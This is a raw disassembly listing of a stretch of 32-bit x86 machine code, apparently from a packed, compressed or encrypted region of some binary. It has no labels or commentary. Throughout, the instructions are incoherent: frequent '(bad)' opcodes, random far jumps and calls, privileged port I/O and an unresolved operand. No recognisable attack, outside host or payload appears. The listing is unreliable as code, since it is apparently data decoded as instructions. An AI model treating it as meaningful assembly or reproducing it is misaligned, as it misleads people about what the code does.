  41543d:	push   edx
  41543e:	mov    edi,0xc84da6d3
  415443:	push   0xa125ff56
  415448:	scas   al,BYTE PTR es:[edi]
  415449:	pop    ebx
  41544a:	gs xchg ebx,eax
  41544c:	outs   dx,DWORD PTR ds:[esi]
  41544d:	pop    ecx
  41544e:	lods   eax,DWORD PTR ds:[esi]
  41544f:	test   DWORD PTR [eax+ecx*4],esi
  415452:	imul   ah
  415454:	push   ss
  415455:	xor    BYTE PTR [ebx+0x79],al
  415458:	sahf   
  415459:	(bad)  
  41545a:	jecxz  0x415466
  41545c:	out    0x1b,al
  41545e:	and    DWORD PTR [ebx],edi
  415460:	mov    ah,BYTE PTR [ecx+0x4f]
  415463:	(bad)  
  415464:	aam    0x33
  415466:	xor    eax,DWORD PTR [edi-0x458fc5fb]
  41546c:	int    0xc6
  41546e:	add    bh,BYTE PTR [edx+0x40]
  415471:	inc    ebx
  415472:	pop    esi
  415473:	pusha  
  415474:	rcr    DWORD PTR [esi-0x3d246368],cl
  41547a:	sbb    ebx,DWORD PTR [ebx+0x28]
  41547d:	xor    DWORD PTR [edx],edx
  41547f:	repnz add DWORD PTR [ecx],ebp
  415482:	sbb    al,bl
  415484:	pop    ss
  415485:	xor    ah,BYTE PTR [edi]
  415487:	(bad)  
  415488:	aas    
  415489:	repz push 0xffffffcd
  41548c:	std    
  41548d:	fimul  DWORD PTR [esi]
  41548f:	retf   0x46c1
  415492:	jmp    0x8a1f:0x286d8d26
  415499:	mov    ds:0xa7330563,eax
  41549e:	int3   
  41549f:	xchg   eax,esp
  4154a1:	sahf   
  4154a2:	sub    eax,0x9cff6517
  4154a7:	enter  0xca23,0x91
  4154ab:	pop    esp
  4154ac:	fwait
  4154ad:	out    dx,eax
  4154ae:	add    ah,BYTE PTR [ebx-0x6f116494]
  4154b4:	jmp    0x4154a4
  4154b6:	and    eax,0x8892ae78
  4154bb:	push   cs
  4154bc:	int    0x5f
  4154be:	cdq    
  4154bf:	popa   
  4154c0:	xchg   ecx,eax
  4154c1:	mov    fs,WORD PTR [ecx-0xea13b66]
  4154c7:	outs   dx,DWORD PTR ds:[esi]
  4154c8:	jae    0x4154ba
  4154ca:	test   al,0xb9
  4154cc:	retf   
  4154cd:	pop    ebp
  4154ce:	cmp    ecx,DWORD PTR [ebx-0x1e34e40b]
  4154d4:	div    DWORD PTR [ecx-0x156ab31f]
  4154da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154db:	aas    
  4154dc:	xchg   edx,eax
  4154dd:	add    DWORD PTR [eax],ecx
  4154df:	xor    eax,0x68332858
  4154e4:	push   ecx
  4154e5:	dec    esi
  4154e6:	mov    DWORD PTR [edi+0x1a],ecx
  4154e9:	stc    
  4154ea:	lods   eax,DWORD PTR ds:[esi]
  4154eb:	outs   dx,BYTE PTR ds:[esi]
  4154ec:	jle    0x4154a7
  4154ee:	or     ebx,eax
  4154f0:	sbb    DWORD PTR [ebx],0x9e601aa2
  4154f6:	neg    ebp
  4154f8:	arpl   WORD PTR [ebx],bp
  4154fa:	in     eax,dx
  4154fb:	imul   edx,DWORD PTR ds:0xc76137c7,0xffffffb9
  415502:	fadd   st(4),st
  415504:	jl     0x41550e
  415506:	mov    bh,0x1b
  415508:	pushf  
  415509:	ins    DWORD PTR es:[edi],dx
  41550a:	mov    bl,0x56
  41550c:	inc    edi
  41550d:	jae    0x415562
  41550f:	(bad)  
  415510:	jmp    0x69ec:0xb297b8f3
  415517:	test   DWORD PTR [ebx-0x39],0xbe2add11
  41551e:	ja     0x4154bd
  415520:	pop    edx
  415521:	push   edx
  415522:	aaa    
  415523:	popf   
  415524:	add    eax,0x3adb12f3
  415529:	push   ebx
  41552a:	mov    dl,0x9f
  41552c:	push   ds
  41552d:	pop    ecx
  41552e:	xlat   BYTE PTR ds:[ebx]
  41552f:	in     eax,dx
  415530:	pop    es
  415531:	std    
  415532:	(bad)  
  415533:	imul   esi,DWORD PTR [ebp+0x894fe3c],0xffffffe7
  41553a:	inc    eax
  41553b:	pop    ebp
  41553c:	inc    esp
  41553d:	or     ebp,DWORD PTR [ecx-0x35]
  415540:	pop    ss
  415541:	icebp  
  415542:	and    al,0xb7
  415544:	pusha  
  415545:	out    dx,eax
  415546:	(bad)  
  415547:	add    BYTE PTR [di-0xc],dh
  41554b:	xchg   edx,eax
  41554c:	scas   eax,DWORD PTR es:[edi]
  41554d:	(bad)  
  41554e:	mov    bh,0xb3
  415550:	dec    esi
  415551:	push   esi
  415552:	out    dx,eax
  415553:	retf   
  415554:	lods   al,BYTE PTR ds:[esi]
  415555:	push   ds
  415556:	xchg   ebx,eax
  415557:	les    eax,FWORD PTR cs:[ebp-0x51]
  41555b:	outs   dx,DWORD PTR ds:[esi]
  41555c:	mov    ch,0x85
  41555e:	pop    ebp
  41555f:	mov    ah,0x2c
  415561:	or     DWORD PTR [esi+0x50],esi
  415564:	xchg   ebp,eax
  415565:	sbb    eax,0xd0e63549
  41556a:	sbb    al,0xbf
  41556c:	pop    ss
  41556d:	push   eax
  41556e:	xchg   ecx,eax
  41556f:	loope  0x4155a5
  415571:	pop    ebp
  415572:	xor    edi,DWORD PTR [esi-0x78]
  415575:	mov    cr2,ecx
  415578:	in     al,dx
  415579:	dec    DWORD PTR [esi]
  41557b:	jno    0x4155ec
  41557d:	and    bh,bh
  41557f:	(bad)  
  415580:	ffree  st(2)
  415582:	xchg   ecx,eax
  415583:	fidiv  DWORD PTR [esi-0x70f90aaa]
  415589:	xchg   DWORD PTR es:[eax-0xd],edx
  41558d:	aas    
  41558e:	aam    0x66
  415590:	mov    dl,0xb
  415592:	sub    DWORD PTR [esi+0x55],eax
  415595:	out    0x8a,eax
  415597:	xchg   ecx,ecx
  415599:	leave  
  41559a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41559b:	stc    
  41559c:	xor    dl,BYTE PTR [ebx-0x35]
  41559f:	test   eax,ecx
  4155a1:	stc    
  4155a2:	sub    BYTE PTR [ecx],0x3e
  4155a5:	(bad)  
  4155a6:	sub    al,0xeb
  4155a8:	das    
  4155a9:	jl     0x4155e5
  4155ab:	adc    eax,0x2c33481b
  4155b0:	mov    ebx,0x67fad950
  4155b5:	nop
  4155b6:	je     0x415572
  4155b8:	gs jecxz 0x4155bf
  4155bb:	(bad)  
  4155bd:	add    BYTE PTR [eax-0x6b3520ab],0xda
  4155c4:	xchg   esp,eax
  4155c5:	add    eax,0x620d4e
  4155ca:	mov    eax,0x1e62c1f6
  4155cf:	std    
  4155d0:	jmp    0xfac9:0x2bff0475
  4155d7:	das    
  4155d8:	(bad)  
  4155d9:	jp     0x4155ab
  4155db:	in     al,0x2f
  4155dd:	cmp    BYTE PTR [edi+0x4a],cl
  4155e0:	mov    ah,0x0
  4155e2:	fcomp  DWORD PTR [esi]
  4155e4:	jmp    0x16d9:0x622876af
  4155eb:	in     al,dx
  4155ec:	mov    ?,ebp
  4155ee:	int    0xfd
  4155f0:	mov    edi,0x40c3b70f
  4155f5:	loopne 0x4155cb
  4155f7:	div    al
  4155f9:	cmp    BYTE PTR [ebx],al
  4155fb:	xor    DWORD PTR [ecx],ebx
  4155fd:	pop    esi
  4155fe:	fcmovne st,st(4)
  415600:	call   0x1afd188b
  415605:	sbb    BYTE PTR [ecx],ch
  415607:	and    al,0x81
  415609:	out    0xef,al
  41560b:	sub    DWORD PTR [edi-0x5d],ebp
  41560e:	mov    edx,0x8919f726
  415613:	icebp  
  415614:	lahf   
  415615:	dec    ebp
  415616:	sub    eax,0xaada02fb
  41561b:	mov    bl,BYTE PTR [edx+0x2722f1fa]
  415621:	icebp  
  415622:	test   eax,0x92678c30
  415627:	sbb    al,0x5a
  415629:	dec    edi
  41562a:	mov    esi,eax
  41562c:	(bad)  
  41562e:	test   al,0xc8
  415630:	mov    eax,ds:0x111ba7be
  415635:	stos   DWORD PTR es:[edi],eax
  415636:	das    
  415637:	dec    esp
  415638:	arpl   WORD PTR [edi],bx
  41563a:	test   dl,dl
  41563c:	fdecstp 
  41563e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41563f:	daa    
  415640:	push   cs
  415641:	(bad)  
  415642:	push   0x7a
  415644:	imul   edx,DWORD PTR [edx+0x41d32fd8],0x5c
  41564b:	imul   ebx,DWORD PTR [edx],0x1ecb73f9
  415651:	mov    ds:0xe08a9b9f,al
  415656:	ins    DWORD PTR es:[edi],dx
  415657:	loop   0x4156d8
  415659:	adc    al,0xd0
  41565b:	xchg   esp,eax
  41565c:	bound  eax,QWORD PTR [esp+ebp*2]
  41565f:	packuswb mm2,QWORD PTR [ecx+0x3]
  415663:	add    BYTE PTR [esi],dl
  415665:	push   edi
  415666:	dec    edi
  415667:	stos   DWORD PTR es:[edi],eax
  415668:	(bad)  
  415669:	outs   dx,DWORD PTR ds:[esi]
  41566a:	mov    bl,0xd1
  41566c:	stc    
  41566d:	lods   al,BYTE PTR ds:[esi]
  41566e:	in     eax,0xdf
  415670:	js     0x4156c8
  415672:	shr    BYTE PTR [ebp-0x4d8589cf],0xfe
  415679:	mov    al,0x67
  41567b:	mov    ecx,DWORD PTR [ecx+0x1b]
  41567e:	add    al,0xde
  415680:	shl    DWORD PTR [edx-0x50],0xa3
  415684:	inc    ebp
  415685:	xchg   BYTE PTR [ebx+esi*1+0x7bd3d6c7],dh
  41568c:	popf   
  41568d:	xchg   ebp,eax
  41568e:	cli    
  41568f:	lea    edi,[eax]
  415691:	ja     0x415690
  415693:	(bad)  
  415694:	sub    ecx,ecx
  415696:	cmp    DWORD PTR [esi],ecx
  415698:	adc    ebp,ebx
  41569a:	leave  
  41569b:	jg     0x41562b
  41569d:	mov    ah,0xdd
  41569f:	pop    edi
  4156a0:	cs shl ebp,1
  4156a3:	mov    fs,WORD PTR [edi+0xd]
  4156a6:	arpl   sp,bx
  4156a8:	into   
  4156a9:	sar    BYTE PTR [edx+0x32],0x82
  4156ad:	loopne 0x415715
  4156af:	cld    
  4156b0:	fistp  DWORD PTR [esp+ebp*8-0x61]
  4156b4:	out    dx,eax
  4156b5:	sbb    eax,0x63
  4156b8:	js     0x415649
  4156ba:	jp     0x415701
  4156bc:	xchg   ebp,eax
  4156bd:	pop    esi
  4156be:	inc    ebx
  4156bf:	sub    ebp,DWORD PTR [edx+ebp*4-0x31]
  4156c3:	mov    esi,0xf020a9ea
  4156c8:	or     dl,cl
  4156ca:	xor    esp,DWORD PTR [ecx-0x69bd50b8]
  4156d0:	sar    BYTE PTR [ecx-0x37ef7331],0x64
  4156d7:	pop    esi
  4156d8:	xor    al,0x5d
  4156da:	fnstenv [esi-0x7b]
  4156dd:	das    
  4156de:	jmp    FWORD PTR [ecx-0x7c482196]
  4156e4:	cwde   
  4156e5:	jb     0x4156fc
  4156e7:	ss jb  0x4156c3
  4156ea:	dec    esp
  4156eb:	popf   
  4156ec:	and    al,0x8b
  4156ee:	mov    dh,ch
  4156f0:	shl    bl,0xd0
  4156f3:	test   BYTE PTR [ecx+0x18],al
  4156f6:	or     DWORD PTR [esp+eiz*4+0x6f],ecx
  4156fa:	or     ebx,DWORD PTR [ebx-0x3e65f4d]
  415700:	mov    ch,0x4d
  415702:	stc    
  415703:	(bad)  
  415704:	cmp    eax,0x80590196
  415709:	or     cl,dh
  41570b:	mov    edx,0x68b9b0f6
  415710:	data16 arpl WORD PTR [ebx],si
  415713:	dec    BYTE PTR [esi+0x4f1d126d]
  415719:	sub    al,0x43
  41571b:	mov    eax,ds:0x70c8a525
  415720:	and    al,0x9d
  415722:	pop    edi
  415723:	or     edi,DWORD PTR [ecx]
  415725:	adc    ebx,edx
  415727:	jns    0x4156ef
  415729:	add    BYTE PTR [eax+edx*4+0x2],0x31
  41572e:	mov    cl,0x54
  415730:	jno    0x4157a8
  415732:	iret   
  415733:	xor    al,ah
  415735:	sub    al,0x3
  415738:	inc    ebx
  415739:	call   0xc9f4:0xf3538128
  415740:	cmp    eax,0x7a0ec6a8
  415745:	(bad)  
  415746:	push   edx
  415747:	push   ebp
  415748:	push   0xfffffff1
  41574a:	dec    edx
  41574b:	test   ch,bl
  41574d:	daa    
  41574e:	pop    ebp
  41574f:	mov    al,0xd3
  415751:	jnp    0x41572e
  415753:	adc    DWORD PTR [edi],ebp
  415755:	mov    edx,0xd6895fd3
  41575a:	aas    
  41575b:	fnstsw WORD PTR [esi]
  41575d:	sub    DWORD PTR [esi-0x1633e6b0],0xffffff87
  415764:	pop    edi
  415765:	and    BYTE PTR [eax-0x68],0x75
  415769:	push   es
  41576a:	lea    eax,[ecx-0x10]
  41576d:	aam    0xde
  41576f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415771:	cmp    BYTE PTR [ecx],dh
  415773:	outs   dx,BYTE PTR ds:[esi]
  415774:	sbb    al,0x8
  415776:	fist   DWORD PTR [ebp+0x34]
  415779:	mov    DWORD PTR [ebx-0x1ed25c3e],edx
  41577f:	mov    ebp,0xd384003
  415784:	jl     0x41570e
  415786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415787:	push   ss
  415788:	inc    eax
  415789:	imul   ebx,DWORD PTR [edx+0x479924d5],0x1d5c6c82
  415793:	or     al,0xfa
  415795:	cmp    BYTE PTR [esi],cl
  415797:	outs   dx,DWORD PTR ds:[esi]
  415798:	jb     0x41580f
  41579a:	jns    0x41575c
  41579c:	sbb    cl,BYTE PTR [edx+edx*1-0x9]
  4157a0:	je     0x415723
  4157a2:	outs   dx,BYTE PTR ds:[esi]
  4157a3:	add    al,0xe
  4157a5:	pop    ecx
  4157a6:	pop    ecx
  4157a7:	mov    bl,0xcc
  4157a9:	adc    DWORD PTR [esp+ebp*1],0xffffffa7
  4157ad:	and    dh,cl
  4157af:	mov    BYTE PTR [edx-0x55],bl
  4157b2:	repz mov ebx,0x646d9e2f
  4157b8:	ins    BYTE PTR es:[edi],dx
  4157b9:	mov    ds:0xf6c014a2,eax
  4157be:	(bad)  
  4157bf:	lahf   
  4157c0:	and    eax,0x8773aeec
  4157c5:	dec    ebx
  4157c6:	pop    ebp
  4157c7:	mov    eax,ds:0x62cdf02e
  4157cc:	sbb    DWORD PTR [edx+0x69],esi
  4157cf:	(bad)  
  4157d0:	(bad)  
  4157d1:	push   eax
  4157d2:	pop    es
  4157d3:	loopne 0x415761
  4157d5:	and    eax,0xcddda68
  4157da:	out    0x1d,eax
  4157dc:	push   esi
  4157dd:	add    WORD PTR [eax+0x22],si
  4157e1:	shl    DWORD PTR [edx],1
  4157e3:	mov    eax,0x3438618d
  4157e8:	pop    ss
  4157e9:	popf   
  4157ea:	inc    ebp
  4157eb:	push   ds
  4157ec:	pop    ebx
  4157ed:	jmp    0x8220:0xadd5be5
  4157f4:	out    0xf,al
  4157f6:	sub    al,0xe8
  4157f8:	dec    edi
  4157f9:	inc    esp
  4157fa:	fsubr  DWORD PTR [ecx-0x1]
  4157fd:	xchg   BYTE PTR ds:0x5c0ef1bd,al
  415803:	gs cs cwde 
  415806:	js     0x41578a
  415808:	or     edi,DWORD PTR [esi]
  41580a:	jbe    0x4157e1
  41580c:	dec    DWORD PTR [esi+0x17cb49cd]
  415812:	push   edi
  415813:	mov    ds:0xd73c00d5,al
  415818:	xor    ah,BYTE PTR [eax+0x68cb4883]
  41581e:	sti    
  41581f:	mov    bh,bh
  415821:	cli    
  415822:	inc    esi
  415823:	push   ebp
  415824:	cmp    eax,0x5169bfdf
  415829:	out    dx,eax
  41582a:	jns    0x41589b
  41582c:	dec    ebp
  41582d:	push   0xecea8464
  415832:	jae    0x415869
  415834:	xor    BYTE PTR [edi],ch
  415836:	and    eax,0x7924b4c6
  41583b:	mov    ebx,0x4cec2ce1
  415840:	aad    0x21
  415842:	mov    ah,0x2d
  415844:	std    
  415845:	xchg   DWORD PTR [ebx],esi
  415847:	fsubr  st,st(5)
  415849:	xchg   edi,eax
  41584a:	xchg   esp,eax
  41584b:	and    ebx,ecx
  41584d:	push   ss
  41584e:	test   eax,0x382fc38b
  415853:	retf   
  415854:	push   0xffffffab
  415856:	lods   al,BYTE PTR ds:[esi]
  415857:	clc    
  415858:	fsubr  DWORD PTR ds:0x1f8a44f8
  41585e:	xchg   ecx,eax
  41585f:	out    0x6c,al
  415861:	inc    esp
  415862:	das    
  415863:	into   
  415864:	cdq    
  415865:	lds    eax,FWORD PTR [eax+0x6f]
  415868:	dec    edx
  415869:	imul   ecx,DWORD PTR [ebx-0x22110d40],0x1e
  415870:	lock xchg edi,eax
  415872:	aam    0x24
  415874:	inc    ecx
  415875:	sbb    bh,BYTE PTR [ecx]
  415877:	fcom   DWORD PTR [edx+ebx*2+0x3793a0b]
  41587e:	pop    ebp
  41587f:	loopne 0x415869
  415881:	push   cs
  415882:	mov    ebp,0x3dcc5955
  415887:	ror    BYTE PTR [ebx-0x5f],cl
  41588a:	imul   ebp,DWORD PTR [eax+0x471a789e],0x10ba8eb5
  415894:	sbb    DWORD PTR [esi],ecx
  415896:	xchg   BYTE PTR [si],dl
  415899:	mov    ecx,0x6b8a5658
  41589e:	lock test al,0xdf
  4158a1:	test   al,0xe4
  4158a3:	xchg   edx,eax
  4158a4:	imul   eax,DWORD PTR ds:[ecx-0x786b81cf],0x1d
  4158ac:	pop    esi
  4158ad:	sbb    esi,DWORD PTR [ebx]
  4158af:	jmp    0xa4d673b4
  4158b4:	inc    ebx
  4158b5:	push   cs
  4158b6:	and    dl,ch
  4158b8:	and    al,0x22
  4158ba:	popa   
  4158bb:	push   ebx
  4158bc:	jg     0x415917
  4158be:	dec    ecx
  4158bf:	push   0x77
  4158c1:	das    
  4158c2:	or     BYTE PTR [edi+0x4b16f1b0],dl
  4158c8:	push   edi
  4158c9:	xchg   edx,eax
  4158ca:	fstp   DWORD PTR [eax+0x41b8bff2]
  4158d0:	push   ebp
  4158d1:	jg     0x4158e0
  4158d3:	fcomp  st(1)
  4158d5:	leave  
  4158d6:	pop    ebx
  4158d7:	scas   al,BYTE PTR es:[edi]
  4158d8:	loop   0x415956
  4158da:	mov    WORD PTR [ebp-0x7b757353],cs
  4158e0:	mov    dl,bl
  4158e2:	pop    eax
  4158e3:	cmp    ebp,DWORD PTR [ebp-0x5031ba6]
  4158e9:	jle    0x415901
  4158eb:	cmp    al,0xd7
  4158ed:	pop    ds
  4158ee:	daa    
  4158ef:	lock jae 0x415947
  4158f2:	adc    eax,0x6d4cdbd
  4158f7:	xor    BYTE PTR [eax+ebx*8-0xc],cl
  4158fb:	aaa    
  4158fc:	add    ch,al
  4158fe:	imul   ebx,DWORD PTR [edi-0x1d],0x70
  415902:	xchg   esi,eax
  415903:	ret    
  415904:	sbb    bl,BYTE PTR [ecx]
  415906:	push   ss
  415907:	sar    esi,0x81
  41590a:	out    0x9d,eax
  41590c:	xor    al,BYTE PTR [edx-0x625f84c5]
  415912:	test   esi,ebx
  415914:	jl     0x4158a2
  415916:	pusha  
  415917:	push   eax
  415918:	mov    eax,ds:0xc876e441
  41591d:	push   eax
  41591e:	rcl    ebp,cl
  415920:	pop    ebx
  415921:	mov    bh,0x80
  415923:	jo     0x415934
  415925:	int3   
  415926:	arpl   WORD PTR [esi-0x77],si
  415929:	ja     0x41593d
  41592b:	jecxz  0x4159a3
  41592d:	adc    dl,BYTE PTR [edx+0x3638d2d2]
  415933:	retf   0x376f
  415936:	push   edx
  415937:	pop    esi
  415938:	xchg   edi,eax
  415939:	xchg   dl,dl
  41593b:	dec    ebp
  41593c:	jae    0x41592c
  41593e:	jb     0x415959
  415940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415941:	mov    eax,0x61793325
  415946:	xor    DWORD PTR [ebx+0x40accb24],0x51989fca
  415950:	add    bh,BYTE PTR [edi-0x64fcabaf]
  415956:	std    
  415957:	call   0xd39b82ad
  41595c:	mov    BYTE PTR [esp+eax*8-0x15],dh
  415960:	or     al,0xbc
  415962:	ss imul esi,ecx,0x21e72507
  415969:	sti    
  41596a:	mov    bl,cl
  41596c:	fwait
  41596d:	clc    
  41596e:	pop    edx
  41596f:	(bad)  
  415970:	loope  0x415977
  415972:	or     eax,0x9580dbdb
  415977:	xchg   ecx,eax
  415978:	and    DWORD PTR [eax-0x6de01770],edi
  41597e:	mov    ebp,0x4c6068d0
  415983:	mov    BYTE PTR [edx],cl
  415985:	push   ebp
  415986:	pushf  
  415987:	inc    edx
  415988:	xchg   cl,bl
  41598a:	test   eax,0xb22843aa
  41598f:	repz out 0x38,eax
  415992:	fld    DWORD PTR [eax+0x68d11048]
  415998:	jge    0x415977
  41599a:	sub    al,0x95
  41599c:	(bad)  
  41599d:	loopne 0x415a12
  41599f:	ret    
  4159a0:	inc    edi
  4159a1:	jp     0x415996
  4159a3:	sbb    DWORD PTR [ebp+0x7fe41a19],esi
  4159a9:	mov    cs,WORD PTR [ecx*2-0x3cc2cbd6]
  4159b0:	fisubr WORD PTR [esi]
  4159b2:	sbb    al,0x9a
  4159b4:	fcomp  DWORD PTR [ecx-0x6c]
  4159b7:	shl    dh,cl
  4159b9:	in     al,0x68
  4159bb:	mov    ebp,0x788e300e
  4159c0:	jbe    0x415a12
  4159c2:	and    ebp,DWORD PTR [edi+0x58119e8e]
  4159c8:	lock or bh,bh
  4159cb:	jmp    0xc59a3bf2
  4159d0:	inc    esp
  4159d1:	sahf   
  4159d2:	loope  0x415a24
  4159d4:	ret    
  4159d5:	inc    ebx
  4159d6:	add    dh,bl
  4159d8:	jne    0x415a2f
  4159da:	in     al,dx
  4159db:	lds    eax,FWORD PTR [eax+esi*2]
  4159de:	mov    ds:0xd7bca047,al
  4159e3:	out    dx,eax
  4159e4:	hlt    
  4159e5:	sbb    cl,ah
  4159e7:	enter  0x4d79,0xad
  4159eb:	imul   ecx,DWORD PTR [ebp+0x4fe87fa0],0x27
  4159f2:	std    
  4159f3:	and    BYTE PTR [ebx],bh
  4159f5:	xchg   DWORD PTR [ebx+0x23206860],ecx
  4159fb:	fistp  WORD PTR [ebx-0x76a20852]
  415a01:	out    0x81,al
  415a03:	mov    ecx,0xd905b74f
  415a08:	ins    BYTE PTR es:[edi],dx
  415a09:	imul   edi,DWORD PTR [edi-0x4a12326a],0x3461c76
  415a13:	fmul   DWORD PTR [edx+edi*1]
  415a16:	xchg   ecx,eax
  415a17:	push   esi
  415a18:	sub    DWORD PTR [esi-0x6fc75531],edx
  415a1e:	dec    edx
  415a1f:	pop    edx
  415a20:	xchg   DWORD PTR [ecx-0x976a35],edx
  415a26:	int3   
  415a27:	or     al,0x4d
  415a29:	adc    al,0xed
  415a2b:	jb     0x4159ef
  415a2d:	cmp    DWORD PTR [esi],edi
  415a2f:	or     eax,0x1cdb60ae
  415a34:	shr    esp,cl
  415a36:	adc    BYTE PTR [ebp-0x4e718fd3],dl
  415a3c:	pushf  
  415a3d:	sub    eax,DWORD PTR [ebx]
  415a3f:	add    ah,BYTE PTR [edi+ebp*8]
  415a42:	mov    ebx,0x86e6600a
  415a47:	push   edx
  415a48:	nop
  415a49:	dec    esi
  415a4a:	mov    al,0x55
  415a4c:	stos   DWORD PTR es:[edi],eax
  415a4d:	(bad)  
  415a4e:	mov    bl,0x80
  415a50:	or     esi,DWORD PTR [edx+edi*2+0xc620048]
  415a57:	mov    dh,0xc9
  415a59:	mov    esi,0xfae2be33
  415a5e:	sbb    BYTE PTR ds:0x98d77606,0x6b
  415a65:	jbe    0x415ac6
  415a67:	add    bh,BYTE PTR [ebx]
  415a69:	inc    ecx
  415a6a:	adc    eax,0xbb841ce4
  415a6f:	jae    0x415a4e
  415a71:	jecxz  0x415a43
  415a73:	es xchg esi,eax
  415a75:	repnz dec ebx
  415a77:	jne    0x415a9d
  415a79:	fsub   QWORD PTR [edx+0x5b345f42]
  415a7f:	retf   
  415a80:	xchg   ebp,ebx
  415a82:	das    
  415a83:	ret    0x5943
  415a86:	dec    DWORD PTR [edi-0x61]
  415a89:	ins    BYTE PTR es:[edi],dx
  415a8a:	jecxz  0x415aea
  415a8c:	sub    DWORD PTR [ecx],esp
  415a8e:	jnp    0x415ad7
  415a90:	js     0x415a71
  415a92:	dec    esi
  415a93:	or     esi,DWORD PTR [edx+0x7870cbe5]
  415a99:	sub    al,0x72
  415a9b:	rcl    BYTE PTR [ebx],cl
  415a9d:	mov    ds:0xe6d1e163,eax
  415aa2:	or     DWORD PTR [edx],esp
  415aa4:	sahf   
  415aa5:	push   0xffffffe3
  415aa7:	pop    esp
  415aa8:	dec    edi
  415aa9:	and    DWORD PTR [ebp+0x75],esi
  415aac:	pop    esi
  415aad:	vmwrite ecx,DWORD PTR [ebx]
  415ab0:	addr16 std 
  415ab2:	push   ebx
  415ab3:	fdivr  DWORD PTR [edi]
  415ab5:	inc    eax
  415ab6:	bnd call 0x596f601e
  415abc:	sub    edx,ecx
  415abe:	sar    BYTE PTR [eax-0x38],cl
  415ac1:	or     cl,BYTE PTR [edi+ebp*8]
  415ac4:	xor    al,0x37
  415ac6:	jp     0x415aaa
  415ac8:	call   0x8a4c:0x4db25083
  415acf:	test   dh,ch
  415ad1:	in     eax,dx
  415ad2:	loop   0x415ae5
  415ad4:	in     al,dx
  415ad5:	and    ebp,DWORD PTR [edx-0x23669891]
  415adb:	lds    ecx,FWORD PTR [ecx*8+0x7fedfbf5]
  415ae2:	arpl   cx,di
  415ae4:	fs cdq 
  415ae6:	jne    0x415ad5
  415ae8:	out    0x1c,eax
  415aea:	sbb    edi,ecx
  415aec:	or     ch,BYTE PTR [ecx-0x60]
  415aef:	popf   
  415af0:	mov    WORD PTR [eax-0x1656db6c],fs
  415af6:	js     0x415ad3
  415af8:	pop    ss
  415af9:	add    ebx,ebp
  415afb:	adc    ah,al
  415afd:	fnsave [esp+edx*8+0x516dc93e]
  415b04:	xchg   edi,eax
  415b05:	xor    al,0x75
  415b07:	mov    ah,0xe4
  415b09:	pop    es
  415b0a:	shl    cl,cl
  415b0c:	popa   
  415b0d:	sub    al,0x85
  415b0f:	hlt    
  415b10:	jno    0x415b39
  415b12:	hlt    
  415b13:	dec    ebx
  415b14:	xchg   ebx,eax
  415b15:	lods   al,BYTE PTR ds:[esi]
  415b16:	imul   BYTE PTR [edi]
  415b18:	test   al,0xba
  415b1a:	pop    esi
  415b1b:	test   al,0x64
  415b1d:	jae    0x415b12
  415b1f:	pusha  
  415b20:	dec    ebp
  415b21:	leave  
  415b22:	jle    0x415b19
  415b24:	or     DWORD PTR [edx],0xffffffa4
  415b27:	xchg   ebx,eax
  415b28:	dec    edx
  415b29:	mov    WORD PTR [eax+0x2a],fs
  415b2c:	leave  
  415b2d:	add    cl,BYTE PTR [esi+0x48]
  415b30:	int    0x73
  415b32:	cmp    eax,0x6cedf974
  415b37:	pop    esp
  415b38:	jnp    0x415af6
  415b3a:	pop    esp
  415b3b:	inc    esi
  415b3c:	add    eax,0x268af0fe
  415b41:	xlat   BYTE PTR ds:[ebx]
  415b42:	push   ecx
  415b43:	mov    DWORD PTR [esi-0x47429db8],edi
  415b49:	out    dx,al
  415b4a:	retf   
  415b4b:	jg     0x415ae6
  415b4d:	int    0xbf
  415b4f:	in     eax,dx
  415b50:	sahf   
  415b51:	in     al,0x37
  415b53:	xchg   edx,eax
  415b54:	rcr    BYTE PTR [edx+0x26],0xae
  415b58:	push   cs
  415b59:	inc    ebp
  415b5a:	(bad)  [esi-0x20]
  415b5d:	mov    DWORD PTR [ecx+ecx*2-0x435faa9d],ebx
  415b64:	jbe    0x415b42
  415b66:	and    edx,ecx
  415b68:	add    ebp,DWORD PTR [edi+0xdcb90d0]
  415b6e:	cli    
  415b6f:	dec    ebx
  415b70:	and    BYTE PTR [ebx],bl
  415b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b73:	in     al,dx
  415b74:	rol    DWORD PTR [edx+0x75819636],1
  415b7a:	retf   
  415b7b:	pop    edx
  415b7c:	sbb    DWORD PTR [ebx+0x73],ecx
  415b7f:	cmp    BYTE PTR [edx-0x67892463],ah
  415b85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b86:	jmp    0x415b5c
  415b88:	lahf   
  415b89:	adc    ah,bl
  415b8b:	call   0x5a9d8165
  415b90:	cdq    
  415b91:	nop
  415b92:	(bad)  
  415b93:	bound  eax,QWORD PTR [ecx+0x3b491b35]
  415b99:	mov    bl,BYTE PTR [eax]
  415b9b:	sti    
  415b9c:	aad    0x4b
  415b9e:	mov    ch,al
  415ba0:	popf   
  415ba1:	(bad)  
  415ba2:	xchg   esi,eax
  415ba3:	das    
  415ba4:	mov    dh,0xa7
  415ba6:	shr    BYTE PTR [edi],0x5
  415ba9:	or     eax,0x18027ebe
  415bae:	cwde   
  415baf:	aas    
  415bb0:	lahf   
  415bb1:	jmp    0xf2c:0x4a4b86f7
  415bb8:	aad    0xfc
  415bba:	jns    0x415bac
  415bbc:	mov    bh,0x9c
  415bbe:	adc    edx,DWORD PTR [esi]
  415bc0:	sub    BYTE PTR [eax+0x1ef5f5e6],bh
  415bc6:	adc    dl,BYTE PTR [ecx+edi*2-0x75]
  415bca:	mov    al,ds:0xcc8a0410
  415bcf:	push   eax
  415bd0:	fild   DWORD PTR [ebp-0x1d90040f]
  415bd6:	mov    bh,0xf
  415bd8:	cdq    
  415bd9:	test   eax,0xd9c413c
  415bde:	or     eax,0xfee12344
  415be3:	(bad)  
  415be4:	lock pusha 
  415be6:	addr16 int 0xb4
  415be9:	loope  0x415c62
  415beb:	inc    esi
  415bec:	(bad)  
  415bed:	mov    ebp,0x9f23b16f
  415bf2:	or     eax,0x92cc170b
  415bf7:	dec    ebp
  415bf8:	push   edi
  415bf9:	jge    0x415bc0
  415bfb:	mov    edi,0x867e1af8
  415c00:	mov    ebp,0x764c317
